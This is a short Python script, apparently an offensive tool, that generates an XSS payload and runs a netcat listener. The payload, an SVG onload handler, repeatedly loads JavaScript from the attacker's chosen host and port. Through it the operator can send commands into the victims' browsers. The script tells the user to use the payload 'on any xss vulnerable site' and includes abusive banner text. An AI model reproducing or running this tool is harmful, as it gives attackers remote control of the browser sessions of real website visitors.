# -*- coding: utf-8 -*-
import socket 
import os
import time
import sys
from subprocess import Popen, PIPE, STDOUT,call


if sys.version_info < (3, 0):
    input = raw_input
time.sleep(0.5)
print('\n')
print('           \033[1;36m=======================================  ')
print("                   \033[1;36mUR SITE IS MINE ASSHOLE *by Br34kC0d3")
print('           \033[1;36m=======================================  \n')

probO = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

probO.connect(("8.8.8.8", 80))

LH = probO.getsockname()[0]

time.sleep(2)
print('Default host',LH)
probO.close()

getI = input("Use default host? [Y or N]").lower()

if getI == 'n':
    LH = input("DESIRED HOST, DONT FUCK WITH THIS *psst use ngrok*: ")
LP = '6969'
getI = input("Use default 6969 por? [Y or N]").lower()
if getI == 'n':
    LP = input("DESIRED PORT, DONT FUCK WITH THE PORT STUPID SCRIPT KIDDIE: ")

print(" ")
time.sleep(0.5)
print('      \033[1;31m=======================================    ')
time.sleep(0.5)
print('        \033[1;31mCreating ur fucking payload dumbass        ')
time.sleep(1)
print('      \033[1;31m=======================================    ')
time.sleep(1)
payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},100);>\n' % (LH, LP)
print(" \n")
time.sleep(1)
print ('\033[F\033[0;32mUse this payload on any xss vulnerable site stupid script kiddie:   '+ payload+'\n')



def shell():
    os.system('printf "\033[F\033[0;31mBr34kC0d3\033[0m\033[1;31m ➮ \033[1;m "; read c; echo "$c" | timeout 1 nc -lp %s > /dev/null' %LP)
    shell()

def getStatus():
    process = Popen('timeout 1 nc -lp %s' %LP, shell=True, stdout=PIPE)
    response = str(process.communicate()[0])
    if 'Accept' in response: 
        print(response.replace('\\r\\n', '\n').replace('b\'', '')[:-3])
        print('\n')
        print('\033[1;33m[!]\033[1;mUR PAYLOAD HAS BEEN EXECUTED ')
        shell()
    else:
        os.system('printf "\033[F"')
        time.sleep(2)
        getStatus()


getStatus()


try: 
    getStatus()
    shell()
except KeyboardInterrupt:
    print('\033[1;33m[!]\033[1;mKeyboard Interrupt')
    exit()
